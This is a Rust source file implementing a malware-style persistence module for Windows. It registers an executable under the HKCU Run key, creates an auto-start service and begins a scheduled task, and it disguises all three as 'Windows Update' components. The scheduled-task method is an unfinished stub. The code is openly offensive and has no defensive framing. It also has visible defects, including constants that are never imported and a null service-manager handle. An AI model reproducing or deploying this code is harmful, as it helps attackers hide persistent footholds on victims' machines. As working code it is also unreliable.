use std::ffi::OsString;
use windows::Win32::Foundation::{HKEY, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use windows::Win32::System::Registry::{RegCreateKeyExW, RegSetValueExW, RegCloseKey};
use windows::Win32::System::Services::{CreateServiceW, SERVICE_AUTO_START, SERVICE_WIN32_OWN_PROCESS};
use windows::Win32::System::TaskScheduler::{ITaskService, TaskScheduler};
use windows::Win32::System::WindowsProgramming::{CLSCTX_INPROC_SERVER, CoCreateInstance};
use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};

pub struct Persistence {
    executable_path: String,
    service_name: String,
    task_name: String,
}

impl Persistence {
    pub fn new(executable_path: String) -> Self {
        Self {
            executable_path,
            service_name: "WindowsUpdateService".to_string(),
            task_name: "WindowsUpdateTask".to_string(),
        }
    }

    pub fn add_registry_persistence(&self) -> Result<(), String> {
        unsafe {
            let mut key: HKEY = std::ptr::null_mut();
            let key_name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            let value_name = "WindowsUpdate";
            
            let result = RegCreateKeyExW(
                HKEY_CURRENT_USER,
                key_name,
                0,
                std::ptr::null_mut(),
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                std::ptr::null_mut(),
                &mut key,
                std::ptr::null_mut(),
            );

            if result.is_err() {
                return Err("Failed to create registry key".to_string());
            }

            let value = self.executable_path.encode_utf16().collect::<Vec<u16>>();
            let result = RegSetValueExW(
                key,
                value_name,
                0,
                REG_SZ,
                Some(&value),
            );

            RegCloseKey(key);

            if result.is_err() {
                return Err("Failed to set registry value".to_string());
            }
        }

        Ok(())
    }

    pub fn add_service_persistence(&self) -> Result<(), String> {
        unsafe {
            let service_name = self.service_name.encode_utf16().collect::<Vec<u16>>();
            let display_name = "Windows Update Service".encode_utf16().collect::<Vec<u16>>();
            let executable_path = self.executable_path.encode_utf16().collect::<Vec<u16>>();

            let result = CreateServiceW(
                std::ptr::null_mut(),
                &service_name,
                &display_name,
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                &executable_path,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );

            if result.is_err() {
                return Err("Failed to create service".to_string());
            }
        }

        Ok(())
    }

    pub fn add_scheduled_task(&self) -> Result<(), String> {
        unsafe {
            let result = CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
            if result.is_err() {
                return Err("Failed to initialize COM".to_string());
            }

            let task_service: ITaskService = CoCreateInstance(
                &TaskScheduler,
                std::ptr::null_mut(),
                CLSCTX_INPROC_SERVER,
            ).map_err(|_| "Failed to create task service".to_string())?;

            // Implementation of task creation would go here
            // This is a simplified version - actual implementation would be more complex
        }

        Ok(())
    }
} 